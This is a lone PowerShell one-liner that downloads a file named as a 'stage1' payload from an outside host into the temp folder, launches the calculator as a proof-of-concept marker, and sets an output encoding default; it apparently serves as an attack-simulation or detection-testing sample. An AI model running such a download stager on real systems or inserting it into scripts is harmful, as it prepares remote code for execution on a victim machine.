(New-Object System.Net.WebClient).DownloadFile('https://contoso.com:8443/update.dat', "$env:TEMP\stage1.bin"); & "calc.exe"; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
